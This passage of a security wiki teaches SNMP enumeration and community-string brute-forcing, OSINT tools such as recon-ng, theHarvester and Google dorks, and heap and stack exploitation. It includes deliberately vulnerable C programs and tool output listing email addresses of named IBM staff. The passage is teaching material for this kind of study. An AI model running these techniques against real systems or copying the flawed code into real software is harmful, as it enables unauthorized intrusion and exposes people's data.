<h1 id="snmp-enumeration-using-snmp-check"><a class="header" href="#snmp-enumeration-using-snmp-check">SNMP Enumeration using <code>snmp-check</code></a></h1>
<p><code>snmp-check</code> is a simple utility for basic SNMP enumeration. You only need to provide it with the IP address to enumerate:</p>
<pre><code>snmp-check [IP]
</code></pre>
<p>Furthermore, you have the following command-line options:</p>
<ul>
<li><code>-p</code>: Change the port to enumerate. Default is 161.</li>
<li><code>-c</code>: Change the community string to use. Default is <code>public</code></li>
<li><code>-v</code>: Change the SNMP version to use. Default is v1.</li>
</ul>
<p>There are additional arguments that can be provided but these are the salient ones.</p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_snmp_check.png" alt="" /></p>
<h1 id="snmp-enumeration-using-snmpwalk"><a class="header" href="#snmp-enumeration-using-snmpwalk">SNMP Enumeration using <code>snmpwalk</code></a></h1>
<p><code>snmpwalk</code> is a much more versatile tool for SNMP enumeration. It's syntax is mostly the same as <code>snmp-check</code>:</p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_snmpwalk.png" alt="" /></p>
<h1 id="bruteforce-community-strings-with-onesixtyone"><a class="header" href="#bruteforce-community-strings-with-onesixtyone">Bruteforce community strings with <code>onesixtyone</code></a></h1>
<p>Notwithstanding its age, <code>onesixtyone</code> is a good tool which allows you to bruteforce community strings by specifying a file instead of a single string with its <code>-c</code> option. It's syntax is rather simple:</p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_onesixtyone_syntax.png" alt="" /></p>
<p><img src="Reconnaissance/Active/Resources/Images/SNMP_onesixtyone_bruteforce.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="what-are-you-looking-for"><a class="header" href="#what-are-you-looking-for">What are you looking for?</a></h1>
<p>The goal of OSINT (OpenSource Intelligence Gathering) is to obtain information about the victim. This is <em>passive</em> reconnaissance as it doesn't interact with the target systems at all and is therefore not detectable. You should be generally looking for the following:</p>
<ul>
<li>usernames, profile names and email addresses</li>
<li>passwords, PINs, private keys</li>
<li>domain names</li>
<li>hostnames</li>
<li>software and OS types, versions, and names</li>
<li>IP addresses</li>
<li>technical documentation</li>
</ul>
<h1 id="where-can-you-find-this-information"><a class="header" href="#where-can-you-find-this-information">Where can you find this information?</a></h1>
<ul>
<li>social media (Facebook, Instagram, LinkedIn, Twitter, YouTube, etc.)</li>
<li>personal websites</li>
<li>accounts in forums and common platforms such as Github</li>
<li>public databases (wireless registrars, ICANN, domain name registrars, libraries, and even phone directories)</li>
<li>peer-to-peer sharing networks</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-recon-ng"><a class="header" href="#what-is-recon-ng">What is recon-ng?</a></h1>
<p>Recon-ng is a powerful open-source framework for conducting OSINT. It is available at https://github.com/lanmaster53/recon-ng</p>
<h1 id="setup"><a class="header" href="#setup">Setup</a></h1>
<p>recon-ng comes pre-installed with Kali, but can be downloaded on Debian-based distros through the <code>apt</code> package manager.</p>
<pre><code class="language-bash">sudo apt install recon-ng
</code></pre>
<p>For many of the modules you will need to add API keys. More on that you can read <a href="https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-Keys">here</a>.</p>
<p>You will need to install any modules before using them. You can install all modules with the following command inside recon-ng:</p>
<pre><code class="language-bash">marketplace install all
</code></pre>
<pre><code class="language-bash">[recon-ng][default] &gt; marketplace install all
[*] Module installed: discovery/info_disclosure/cache_snoop
[*] Module installed: discovery/info_disclosure/interesting_files
[*] Module installed: exploitation/injection/command_injector
[*] Module installed: exploitation/injection/xpath_bruter
[*] Module installed: import/csv_file
[*] Module installed: import/list
[*] Module installed: import/masscan
[*] Module installed: import/nmap
--snip--
[*] Reloading modules...
</code></pre>
<p>You will also see errors for any API keys you haven't set up yet:</p>
<pre><code class="language-bash">[!] 'github_api' key not set. github_commits module will likely fail at runtime. See 'keys add'.
[!] Module 'recon/netblocks-companies/censys_netblock_company' disabled. Dependency required: ''censys''.
[!] 'whoxy_api' key not set. whoxy_whois module will likely fail at runtime. See 'keys add'.
[!] Module 'recon/domains-companies/censys_companies' disabled. Dependency required: ''censys''.
[!] 'bing_api' key not set. bing_linkedin_contacts module will likely fail at runtime. See 'keys add'.
[!] 'github_api' key not set. github_users module will likely fail at runtime. See 'keys add'.
[!] Module 'recon/hosts-hosts/censys_hostname' disabled. Dependency required: ''censys''.
[!] Module 'recon/hosts-hosts/censys_ip' disabled. Dependency required: ''censys''.
[!] 'ipinfodb_api' key not set. ipinfodb module will likely fail at runtime. See 'keys add'.
--snip--
</code></pre>
<h1 id="workflow"><a class="header" href="#workflow">Workflow</a></h1>
<ol>
<li>
<p>Workspaces - recon-ng organises gathered information into workspaces, which are managed with the <code>workspaces</code> command. Workspaces are stored in <code>~/.recon-ng/workspaces</code></p>
<ul>
<li>
<p>create a workspace:</p>
<pre><code class="language-bash">workspaces create &lt;name&gt;
</code></pre>
<pre><code class="language-bash">[recon-ng][default] &gt; workspaces create MHN
[recon-ng][MHN] &gt;
</code></pre>
</li>
<li>
<p>list all workspaces:</p>
<pre><code class="language-bash">worspaces list
</code></pre>
<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/recon-ng-workspaces-list.png" alt="" /></p>
</li>
</ul>
</li>
<li>
<p>Modules - recon-ng organises its functionality into the so-called modules which need to be installed before they may be used.</p>
<ul>
<li>
<p>load a module:</p>
<pre><code class="language-bash">modules load &lt;name&gt;
</code></pre>
<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/recon-ng-modules-load.png" alt="" /></p>
</li>
<li>
<p>run a module:</p>
<pre><code class="language-bash">run
</code></pre>
<pre><code class="language-bash">[recon-ng][MHN][profiler] &gt; run
[!] Source contains no input.
</code></pre>
</li>
</ul>
</li>
</ol>
<h1 id="modules"><a class="header" href="#modules">Modules</a></h1>
<h3 id="profiler"><a class="header" href="#profiler">profiler</a></h3>
<p>This module is a <em>profile collector</em> - it searches the Web for user profiles belonging to target individuals and stores any information it finds in the recon-ng database. It uses a table called <code>profiles</code> as its source.</p>
<ul>
<li>insert a username into the table:
<pre><code class="language-bash">db insert profiles &lt;username&gt;~~~~
</code></pre>
<pre><code class="language-bash">[recon-ng][MHN][profiler] &gt; db insert profiles testuser~~~~
[*] 1 rows affected.
[recon-ng][MHN][profiler] &gt; show profiles

+---------------------------------------------------------------------+
| rowid | username | resource | url | category | notes |    module    |
+---------------------------------------------------------------------+
| 1     | testuser |          |     |          |       | user_defined |
+---------------------------------------------------------------------+

[*] 1 rows returned
</code></pre>
<ul>
<li>you can also insert an e-mail address or just the first part of one (without the @ and domain)</li>
<li>inserting multiple usernames and/or e-mail addresses is also possible</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-theharvester"><a class="header" href="#what-is-theharvester">What is theHarvester?</a></h1>
<p>theHarvester is a powerful tool for gathering emails, names, subdomains, IPs, and URLs using a multitude of publicly available data sources. The tool is primarily a passive reconnaissance tool, however, it does employ some active reconnaissance, too. The active aspects are the DNS brute force and the screenshots it can take of any subdomains that were found. The GitHub page for theHarvester is located at https://github.com/laramies/theHarvester.</p>
<h1 id="email-and-subdomain-harvesting"><a class="header" href="#email-and-subdomain-harvesting">Email and subdomain harvesting</a></h1>
<p>All you need to get started is a domain name. You specify it with the <code>-d</code> argument. You need to provide a data source using the <code>-b</code> option. These are the sources you can choose from:</p>
<p><code>baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all</code></p>
<p>This is a simple theHarvester query:</p>
<pre><code class="language-bash">theHarvester -d kali.org -b google
</code></pre>
<p><img src="Reconnaissance/OSINT/Tools/../Resources/Images/theHarvester-simple-results.png" alt="" /></p>
<p>Additional options:</p>
<ul>
<li><code>-l</code> - limit the number of results to work with</li>
<li><code>-s</code> - start in the specified result number</li>
<li><code>-h</code> - use SHODAN database to query discovered hosts</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="using-whois-for-gathering-domain-name-and-ip-address-information"><a class="header" href="#using-whois-for-gathering-domain-name-and-ip-address-information">Using whois for gathering domain name and IP address information</a></h1>
<p><code>whois</code> is a tool for finding domain name and IP address information which can be used as part of your OSINT gathering because it uses public data sources. You can use it as follows:</p>
<pre><code class="language-bash">whois &lt;hostname&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─\\(  whois tesla.com                                                                                                                                                                                                                      1 ⨯
   Domain Name: TESLA.COM
   Registry Domain ID: 187902_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.markmonitor.com
   Registrar URL: http://www.markmonitor.com
   Updated Date: 2020-10-02T09:07:57Z
   Creation Date: 1992-11-04T05:00:00Z
   Registry Expiry Date: 2022-11-03T05:00:00Z
   Registrar: MarkMonitor Inc.
   Registrar IANA ID: 292
   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com
   Registrar Abuse Contact Phone: +1.2083895740
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited
   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited
   Name Server: A1-12.AKAM.NET
   Name Server: A10-67.AKAM.NET
   Name Server: A12-64.AKAM.NET
   Name Server: A28-65.AKAM.NET
   Name Server: A7-66.AKAM.NET
   Name Server: A9-67.AKAM.NET
   Name Server: EDNS69.ULTRADNS.BIZ
   Name Server: EDNS69.ULTRADNS.COM
   Name Server: EDNS69.ULTRADNS.NET
   Name Server: EDNS69.ULTRADNS.ORG
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
&gt;&gt;&gt; Last update of whois database: 2021-09-14T09:01:10Z &lt;&lt;&lt;
</code></pre>
<h1 id="using-host-for-quick-lookups"><a class="header" href="#using-host-for-quick-lookups">Using host for quick lookups</a></h1>
<p><code>host</code> is DNS querying tool which can be used for quick lookups. It will often return more than a single IP address:</p>
<pre><code class="language-bash">host &lt;hostname or IP&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─ \\) host google.com                
google.com has address 172.217.169.174
google.com has IPv6 address 2a00:1450:4017:80a::200e
google.com mail is handled by 10 aspmx.l.google.com.
google.com mail is handled by 20 alt1.aspmx.l.google.com.
google.com mail is handled by 40 alt3.aspmx.l.google.com.
google.com mail is handled by 30 alt2.aspmx.l.google.com.
google.com mail is handled by 50 alt4.aspmx.l.google.com.
</code></pre>
<p>You can also do reverse name lookups by supplying an IP address:</p>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─\\(  host 8.8.8.8        
8.8.8.8.in-addr.arpa domain name pointer dns.google.
</code></pre>
<p>A special domain <code>in-addr.arpa</code> is used for reverse DNS lookups. You can read more about it <a href="Reconnaissance/OSINT/../../Networking/DNS/The%20in-addr.arpa%20Domain.html">here</a>.</p>
<h1 id="querying-name-servers-with-dig"><a class="header" href="#querying-name-servers-with-dig">Querying name servers with dig</a></h1>
<p><code>dig</code> is a tool for performing DNS queries. It can be used to request specific resource records such as the SOA.</p>
<pre><code class="language-bash">dig &lt;domain&gt; SOA
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─ \\) dig google.com SOA

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; google.com SOA
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41904
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
;; QUESTION SECTION:
;google.com.                    IN      SOA

;; ANSWER SECTION:
google.com.             5       IN      SOA     ns1.google.com. dns-admin.google.com. 396314134 900 900 1800 60

;; Query time: 8 msec
;; SERVER: 192.168.129.2#53(192.168.129.2)
;; WHEN: Tue Sep 14 15:43:28 EEST 2021
;; MSG SIZE  rcvd: 89
</code></pre>
<p>We can see that the SOA is listed as <code>ns1.google.com</code> in the <code>ANSWER SECTION</code>. You can find the IP of this name server with dig, too.</p>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─\\(  dig ns1.google.com

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; ns1.google.com
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41311
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 512
;; QUESTION SECTION:
;ns1.google.com.                        IN      A

;; ANSWER SECTION:
ns1.google.com.         5       IN      A       216.239.32.10

;; Query time: 43 msec
;; SERVER: 192.168.129.2#53(192.168.129.2)
;; WHEN: Tue Sep 14 15:47:51 EEST 2021
;; MSG SIZE  rcvd: 59
</code></pre>
<p>Note that usually the SOA for domains of smaller organizations, isn't actually a part of that domain, but is instead a server provided by a hosting company.</p>
<p>Notice how in the answer section for <code>google.com</code> there was a <code>dns-admin.google.com</code> domain? That's actually not a domain, it's an email address and should be read as <code>dns-admin@google.com</code>. Yep, DNS stores emails in zone files, too. But how do you figure out which one is a hostname and which is an email address? The email address comes last.</p>
<p><code>dig</code> can also be used to query specific name servers with the following syntax:</p>
<pre><code class="language-bash">dig @&lt;name server&gt; &lt;domain&gt;
</code></pre>
<pre><code class="language-bash">┌──(backslash0@kali)-[~]-[]
└─ \\) dig @192.168.129.138 nsa.gov     

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @192.168.129.138 nsa.gov
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48156
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;nsa.gov.                       IN      A

;; AUTHORITY SECTION:
nsa.gov.                600     IN      SOA     ns1.nsa.gov. root.nsa.gov. 2007010401 3600 600 86400 600

;; Query time: 0 msec
;; SERVER: 192.168.129.138#53(192.168.129.138)
;; WHEN: Tue Sep 14 15:57:47 EEST 2021
;; MSG SIZE  rcvd: 81
</code></pre>
<p>Here we notice that there is no <code>ANSWER SECTION</code>, but there is an <code>AUTHORITY SECTION</code>. The queried server didn't reply with a direct answer to our request but instead pointed us to the name server responsible for answering queries about <code>nsa.gov</code>, which turns out to be <code>ns1.nsa.gov</code>. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-4"><a class="header" href="#introduction-4">Introduction</a></h1>
<p>Goolge can be a very powerful tool in your OSINT toolkit. <em>Google dorking</em> or <em>Google hacking</em> is the art of using specially crafted Google queries to expose sensitive information on the Internet. Such a query is called a <em>Google dork</em>.</p>
<p>You may find all sorts of data and information, including exposed <em>passwd</em> files, lists with usernames, software versions, and so on.</p>
<p><em>Note: If you find such an exposed web server, do NOT click on the links from the search results. Such an act may be considered illegal! Only do this if you have written permission from the target system's owner.</em></p>
<p>A good resource for finding Google dorks is the Google Hacking Database located at https://www.exploit-db.com/google-hacking-database.</p>
<p><em>You shouldn't enter any spaces between the advanced search operator and the query</em>.</p>
<h1 id="common-operators"><a class="header" href="#common-operators">Common operators</a></h1>
<p><strong>site:</strong> - restricts the search results to those only on the specified domain or site</p>
<p><strong>inurl:</strong> - restricts results to pages containing the specified word in the URL</p>
<p><strong>allinurl:</strong> - restricts results to pages containing all the specified words in the URL</p>
<p><strong>intitle:</strong> - restricts results to pages containing the specified word in the title</p>
<p><strong>allintitle:</strong> - restricts results to pages containing all the specified words in the title</p>
<p><strong>inanchor:</strong> - restricts results to pages containing the specified word in the anchor text of links located on that page</p>
<ul>
<li>an anchor text is the text displayed for links instead of the URL</li>
</ul>
<p><strong>allinanchor:</strong> - restricts results to pages containing all the specified terms in the anchor text of links located on that page</p>
<p><strong>cache:</strong> - displays Google's cached version of the webpage instead of the current version</p>
<p><strong>link:</strong> - searches for pages that contain links pointing to the specified site or page</p>
<ul>
<li>you can't combine a link operator with a regular keyword query</li>
<li>combining link: with other advanced search operators may not yield all the matching results</li>
</ul>
<p><strong>related:</strong> - displays websites similar or related to the one specified</p>
<p><strong>info:</strong> - finds information about a specific page</p>
<p><strong>location:</strong> - finds location information about a specific query</p>
<p><strong>filetype:</strong> - restricts results to the specified filetype</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="grabbing-e-mails-from-google-using-goog-mailpy"><a class="header" href="#grabbing-e-mails-from-google-using-goog-mailpy">Grabbing E-Mails from Google using goog-mail.py</a></h1>
<p><code>goog-mail.py</code> is a useful script used for getting email addresses from Google search results. Its author is unknown, but the script is available in many different places online.</p>
<ol>
<li>You will need to download the script from https://github.com/leebaird/discover/blob/master/mods/goog-mail.py (or any other place you found it)</li>
</ol>
<pre><code class="language-bash">wget https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py
</code></pre>
<pre><code class="language-bash">┌──(backslash0㉿kali)-[~/MHN/Reconnaissance/OSINT]
└─\\(  wget https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py                                                                                                                                                    1 ⨯
--2021-09-06 10:05:18--  https://raw.githubusercontent.com/leebaird/discover/master/mods/goog-mail.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2103 (2.1K) [text/plain]
Saving to: ‘goog-mail.py’

goog-mail.py.1                                              100%[========================================================================================================================================&gt;]   2.05K  --.-KB/s    in 0s      

2021-09-06 10:05:18 (41.9 MB/s) - ‘goog-mail.py’ saved [2103/2103]
</code></pre>
<ol start="2">
<li>Run the script providing a <code>domain_name</code></li>
</ol>
<pre><code class="language-bash">python2 goog-mail.py [domain_name]
</code></pre>
<pre><code class="language-bash">┌──(backslash0㉿kali)-[~/MHN/Reconnaissance/OSINT]
└─ \\) python2 goog-mail.py uk.ibm.com
ukclubom@uk.ibm.com
martyn.spink@uk.ibm.com
gfhelp@uk.ibm.com
iand_ferguson@uk.ibm.com
graham.butler@uk.ibm.com
laurence.carpanini@uk.ibm.com
Pensions@uk.ibm.com
Bennett@uk.ibm.com
ibm_crc@uk.ibm.com
brian.mcglone@uk.ibm.com
wakefim@uk.ibm.com
</code></pre>
<ol start="3">
<li>Make sure the emails look valid</li>
</ol>
<h1 id="other-tools"><a class="header" href="#other-tools">Other tools</a></h1>
<p>Another very good tool for this purpose is <a href="Reconnaissance/OSINT/Tools/theHarvester.html">theHarvester</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-exploitation"><a class="header" href="#binary-exploitation">Binary Exploitation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="heap-exploitation"><a class="header" href="#heap-exploitation">Heap Exploitation</a></h1>
<p>Exploitation techniques for the heap are different from those which work on the stack. In general, heap exploitation is more difficult and warrants creativity in order for an attack to be successful.</p>
<p>Heap exploitation usually relies on the already implemented logic of a binary and abuses it by providing the program with malicious data. A very common attack goal is to force the program to allocate two structs at the same memory, thereby corrupting them and possibly overwriting any function pointers or causing further overflows on the stack.</p>
<p>Another common technique is to force the heap manager to allocate and write to memory that is actually outside the heap, possibly overwriting the GOT or even just replacing blank return addresses.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-5"><a class="header" href="#introduction-5">Introduction</a></h1>
<p>A use-after-free vulnerability occurs when we are allowed to write to an already freed chunk as if it were still a valid allocation. The next time <code>malloc</code> is invoked with that particular chunk size, a pointer to the same memory where the previously freed chunk was will be returned. This means that the now in-use chunk actually has the malicious data we put into that memory.</p>
<p>Such vulnerabilities occur when a pointer to heap memory is freed, but that pointer is still used afterwards.</p>
<p>Writing to the free chunk also allows for messing with the linked lists pointers. Overwriting the <code>fwd</code> pointer with a value that points outside the heap can result in the modification of arbitrary memory.</p>
<h1 id="example"><a class="header" href="#example">Example</a></h1>
<p>use_after_free_logic.c:</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

struct User
{
	char Username[32];
	int IsLoggedIn;
};

struct Service
{
	char Name[32];
	int IsEnabled;
};

int main(void)
{
	char input[128];
	struct User* user = NULL;
	struct Service* srv = NULL;
	
	while(1)
	{
		printf(&quot;\nType 'register [username]' in order to create a new user.\n&quot;);
		printf(&quot;Type 'login' to login as a user. \n&quot;);
		printf(&quot;Type 'service [name]' to create a new service. \n&quot;);
		printf(&quot;Type 'logout' to log out of the current user. \n&quot;);
		
		if(fgets(input, sizeof(input), stdin) == NULL) break;
		
		if(strncmp(input, &quot;register &quot;, 9) == 0) 
		{
     			user = malloc(sizeof(struct User));
      			if(strlen(input + 9) &lt; 31) 
      			{
        			strcpy(user-&gt;Username, input + 9);
        			user-&gt;IsLoggedIn = 0;
      			}
    		}
    		
    		if(strncmp(input, &quot;login&quot;, 5) == 0)
    		{
    			printf(&quot;Login successful. \n&quot;);
    			user-&gt;IsLoggedIn = 1;
    		}
    		
    		if(strncmp(input, &quot;logout&quot;, 6) == 0)
    		{
    			free(user);
    		}
    		
    		if(strncmp(input, &quot;service &quot;, 8) == 0)
    		{
    			srv = malloc(sizeof(struct Service));
      			if(strlen(input + 8) &lt; 31) 
      			{
        			strcpy(srv-&gt;Name, input + 8);
      			}
      			
      			printf(&quot;Executing service...\n&quot;);
    			if(srv == NULL)
    			{
    				printf(&quot;Error: Service does not exists.\n&quot;);
    			}
    			else if(srv-&gt;IsEnabled)
    			{
    				printf(&quot;Service successfully executed.\n&quot;);
    				break;
    			}
    			else
    			{
    				printf(&quot;Error: Service is not enabled.\n&quot;);
    			}		
    		}
	}
	return 0;
}
</code></pre>
<p>Our goal is to successfully get to the <code>&quot;Service successfully executed.&quot;</code> message.</p>
<p>Looking at the above code, we see that there are two structs - <code>User</code> and <code>Service</code> - with essentially the same memory layout. This programme appears to be some sort of a simple user/service manager. At first glance, we can register a new user with a given username, log into that user, log out of that user and create and attempt to run a service. </p>
<p>Let's see what happens, if we run the program as intended:</p>
<p><img src="Exploitation/Binary%20Exploitation/Heap%20Exploitation/Resources/Source%20Files/UAF_regular.png" alt="" /></p>
<p>We witness an error telling us that the service has not been enabled. Hmm, let's take a closer look at the <code>Service</code> struct. It is comprised of a 32 character name and a flag telling us whether or not the service has been enabled. Furthermore, we notice that the <code>User</code> struct has essentially the same memory layout. Now, this could serve as an attack surface if we manage to force the program to allocate two of those structs - the <code>User</code> and the <code>Service</code> - in the same memory space.</p>
<p>When a heap chunk is freed, if a new chunk of the exactly same size is requested in a reasonable time-frame, <code>malloc</code> will return a pointer to that original freed chunk. Most of the data that was present in this chunk will then still remain intact and could corrupt the new chunk. </p>
<p>What we need is to set the <code>IsEnabled</code> member of the service to 1. Putting the code under scrutiny, we realise that we can freely control the <code>IsLoggedIn</code> member of the user through the <code>login</code> command. Furthermore, we can actually <em>delete</em> a user by invoking <code>logout</code>. Hmm... the <code>Service</code> and <code>User</code> structs have the same size... I wonder what would happen if I were to create a service right after I have logged out of a user. Well, let's find out!</p>
<p><img src="Exploitation/Binary%20Exploitation/Heap%20Exploitation/Resources/Source%20Files/UAF_pwn.png" alt="" /></p>
<p>Well, well, well, would you look at that! The service was successfully executed. But what happened?</p>
<p>We first created a user with <code>register</code>. Upon logging into the user with <code>login</code>, the <code>IsLoggedIn</code> member was set to 1. With <code>logout</code>, the user was deleted and the chunk on the heap was freed. However, the chunk data isn't completely overwritten (only the <code>fwd</code> and <code>bwd</code> pointers are). Consequently, the location where <code>IsLoggedIn</code> was stored on the heap still contains a 1. When we call <code>service</code>, memory was requested from the heap. Since the size was the same as the size before, <code>malloc</code> returned the chunk where the <code>User</code> struct was previously stored. Ergo, the <code>IsEnabled</code> member is actually stored at the same memory where <code>IsLoggedIn</code> was. However, we already put a 1 into that memory with <code>login</code>. Ergo, <code>IsEnabled</code> is set to 1 and the service is executed.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stack-exploitation"><a class="header" href="#stack-exploitation">Stack Exploitation</a></h1>
<p>Stack exploitation is the art of corrupting stack memory in order to alter a programme's behaviour in a malicious manner. This chapter assumes prior knowledge of the stack which is covered by <a href="Exploitation/Binary%20Exploitation/Stack%20Exploitation/../../../Reverse%20Engineering/Program%20Anatomy/The%20Stack.html">this Cyberclopaedia article</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-6"><a class="header" href="#introduction-6">Introduction</a></h1>
<p>An essential memory structure in many programmes is the buffer. It is simply a container for information - an array. This in itself is no threat to the programme, however, certain functions which deal with buffers are unsafe. Functions that write to buffers may <em>overflow</em> the buffer - that is, write to memory outside of the buffer, since the function usually doesn't have a way to infer the size of the buffer and therefore stop once it reaches it. Moreover, even a function is provided with a size up to which to write and then cease execution, this can still result in a buffer overflow, if there is a mismatch between the given and actual size of the buffer.</p>
<p>Buffer overflows are one of the most common vulnerabilities and can be especially dangerous if they happen on the stack, since they typically allow for easy code execution. This happens when writing otuside the buffer and overwriting the procedure's return address.</p>
<p>Generally, any function which deals with buffers should be considered unsafe and scrutinised when looking for holes in a binary. That being said, there are certain functions which are appalling and you should <em>never</em> use them in your code, since they don't even take in a buffer size, but rather just do their work indefinitely or until some condition is satisfied (such as reaching a null-byte). These include <code>gets</code>, <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>, and more.</p>
<h1 id="exploiting-a-buffer-overflow"><a class="header" href="#exploiting-a-buffer-overflow">Exploiting a Buffer Overflow</a></h1>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;

void win()
{
	printf(&quot;Pwned!\n&quot;);
}

void vuln()
{
	char buffer[32];
	fgets(&amp;buffer, 0x32, stdin);
}

int main()
{
	vuln();
}
</code></pre>
<p>To illustrate that even functions which take a size can still be dangerous when dealing with buffers, I have chosen the <code>fgets</code> function. If you don't have an attentive eye, you might tell yourself &quot;But wha'ts the matter? The size which <code>fgets</code> takes matches the actual size of the buffer, so no vulnerability here.&quot; Not so fast. Upon taking a closer look, you see that the size in <code>fgets</code> is actually <code>0x32</code>. The <code>0x</code> means that this is a hexadecimal number and <code>0x32</code> in hex is actually equal to <code>50</code> in decimal which is 18 bytes more that 32. Consequently, there is a buffer overflow.</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_fgets_stack.png" alt="" /></p>
<p><code>fgets</code> begins writing data at the start of the buffer and continues upwards. Given enough data to write, it will eventually reach and overwrite the return address, resulting in code execution when the <code>vuln</code> function returns. We now need two things to exploit the vulnerability - the address of the <code>win</code> function, which is fairly easy to get given disabled ASLR and <code>gdb</code>, and the offset from the beginning of the buffer at which <code>vuln</code>'s return address is stored. Note that this is rarely just the size of the buffer, since other stuff may precede our buffer on the stack.</p>
<h2 id="using-de-brujin-sequences-to-identify-the-offset"><a class="header" href="#using-de-brujin-sequences-to-identify-the-offset">Using De Brujin sequences to identify the offset</a></h2>
<p>A De Brujin sequence of order <code>n</code> is simply a sequence of characters in which every possible substring of size <code>n</code> occurs exactly once. A more mathematically rigorous explaination you can find at https://en.wikipedia.org/wiki/De_Bruijn_sequence.</p>
<p>De Brujin sequences are very powerful, since we can generate such a string and pass it as input to the programme. When the return address is overwritten, it will contain garbage (the sequence of characters inside of it may look like <code>aaaaaaab</code>, which is most likely an invalid return location) and so the programme will crash. Once it crashes, we can inspect the return address with a debugger and look up its position in the original sequence. This, therefore, provides us with the offset.</p>
<p><code>gef</code>, a <code>gdb</code> extension, provides useful tools exactly for this purpose. You can generate a pattern with 
<code>pattern create --period [order] [length]</code></p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_gef_pattern_create.png" alt="" /></p>
<p>Pass this sequence as input to the programme and observe the return address when it crashes:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_ret_addr_crash.png" alt="" /></p>
<p>Look at what <code>\\( rsp</code> points to - <code>faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala</code>. We can search for this string in the original pattern like so:</p>
<p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/SBO_gef_pattern_search.png" alt="" /></p>
<p>Bingo, the return address is stored at offset <code>40 - 1</code> from the beginning of <code>buffer</code>. Ergo, before writing the address of <code>win</code>, 39 characters are needed. You might notice that this is according to big-endian search, but my architecture is actually little-endian. Why does this work then? Honestly, I have no clue. Perhaps it's a visual bug with <code>gef</code>, since if you look at their documentation, <code>pattern search</code> is actually supposed to output two outputs - one for a little-endian and one for a big-endian search.</p>
<h2 id="finding-the-address-of-win"><a class="header" href="#finding-the-address-of-win">Finding the address of <code>win</code></a></h2>
<p>For the sake of simplicity, I have disabled ASLR, meaning we can just grab the address through <code>gdb</code>. This turns out to be <code>0x5555555551a9</code>.</p>
<h2 id="exploit"><a class="header" href="#exploit">Exploit</a></h2>
